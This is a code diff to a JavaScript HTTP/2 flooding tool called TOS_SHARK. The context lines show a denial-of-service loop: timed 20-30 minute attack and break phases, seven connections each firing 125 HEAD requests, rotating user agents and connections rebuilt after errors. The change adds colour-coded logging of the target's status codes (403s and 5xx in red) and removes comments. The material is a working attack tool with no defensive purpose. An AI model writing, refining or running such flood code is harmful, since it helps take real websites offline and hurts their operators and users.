@@ -29,6 +29,16 @@ class TOS_SHARK {
         this.connections = [];
         this.maxConnections = 7;
         
+        // Color codes
+        this.colors = {
+            reset: '\x1b[0m',
+            darkMagenta: '\x1b[35m',
+            darkGreen: '\x1b[32m',
+            red: '\x1b[91m',
+            green: '\x1b[92m',
+            yellow: '\x1b[93m'
+        };
+        
         this.startCycle();
     }
 
@@ -60,7 +70,6 @@ class TOS_SHARK {
                 
                 // Handle connection errors
                 client.on('error', () => {
-                    // Try to recreate connection
                     setTimeout(() => {
                         const idx = this.connections.indexOf(client);
                         if (idx !== -1) {
@@ -72,9 +81,7 @@ class TOS_SHARK {
                         }
                     }, 1000);
                 });
-            } catch (err) {
-                // Connection failed, will retry later
-            }
+            } catch (err) {}
         }
     }
 
@@ -83,23 +90,19 @@ class TOS_SHARK {
             const now = Date.now();
             
             if (this.attackActive) {
-                // Attack phase (20-30 minutes)
                 if (now - this.attackStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
                     this.startBreak();
                     continue;
                 }
                 
-                // Execute H2-MULTIPLEX with 7 connections
                 await this.attackH2Multiplex();
                 
             } else {
-                // Break phase (20-30 minutes)
                 if (now - this.breakStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
                     this.startAttack();
                     continue;
                 }
                 
-                // Maintenance during break
                 await this.performMaintenance();
                 await this.sleepRandom(1000, 3000);
             }
@@ -116,17 +119,13 @@ class TOS_SHARK {
     startBreak() {
         this.attackActive = false;
         this.breakStart = Date.now();
-        
-        // Clean up connections during break
         this.cleanupConnections();
     }
 
     // ===== ATTACK METHOD =====
     async attackH2Multiplex() {
-        // Use all 7 connections
         for (const client of this.connections) {
             if (client && !client.destroyed && client.socket && !client.socket.destroyed) {
-                // Send 125 HEAD requests per connection
                 for (let i = 0; i < 125; i++) {
                     this.sendH2HeadRequest(client);
                     this.totalReqs++;
@@ -163,13 +162,8 @@ class TOS_SHARK {
 
     // ===== MAINTENANCE =====
     async performMaintenance() {
-        // Force garbage collection
         if (global.gc) global.gc();
-        
-        // Rotate user agents
         this.userAgents = this.generateUserAgents();
-        
-        // Recreate connections
         this.cleanupConnections();
         this.createConnections();
     }
@@ -180,19 +174,45 @@ class TOS_SHARK {
                 if (client && !client.destroyed) {
                     client.destroy();
                 }
-            } catch (e) {
-                // Ignore
-            }
+            } catch (e) {}
         }
         this.connections = [];
     }
 
-    // ===== LOGGING =====
+    // ===== LOGGING WITH COLOR CODING =====
     logStatus(status) {
         const now = Date.now();
         if (now - this.lastLog >= 10000) {
             this.lastLog = now;
-            console.log(`TØR-2M11:${this.totalReqs} ---> ${status}`);
+            
+            // Format: TØR-2M11 = darkMagenta, totalReqs = darkGreen
+            const prefix = `${this.colors.darkMagenta}TØR-2M11${this.colors.reset}:${this.colors.darkGreen}${this.totalReqs}${this.colors.reset} ---> `;
+            
+            // Status code color logic
+            let statusColor = this.colors.green; // Default for 2xx
+            let statusText = status;
+            
+            if (status === '*.*') {
+                statusColor = this.colors.red;
+                statusText = '*.*';
+            } else if (typeof status === 'number') {
+                if (status >= 500) {
+                    // 5xx - Red
+                    statusColor = this.colors.red;
+                } else if (status >= 400) {
+                    // 4xx - Red (including 403)
+                    statusColor = this.colors.red;
+                } else if (status >= 300) {
+                    // 3xx - Yellow (for 3xx redirects)
+                    statusColor = this.colors.yellow;
+                } else if (status >= 200) {
+                    // 2xx - Green
+                    statusColor = this.colors.green;
+                }
+            }
+            
+            // Output with color coding
+            console.log(prefix + `${statusColor}${statusText}${this.colors.reset}`);
         }
     }
 
@@ -200,10 +220,6 @@ class TOS_SHARK {
     sleepRandom(min, max) {
         const duration = Math.random() * (max - min) + min;
         return new Promise(resolve => setTimeout(resolve, duration));
-    }
-
-    sleep(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
     }
 }
 
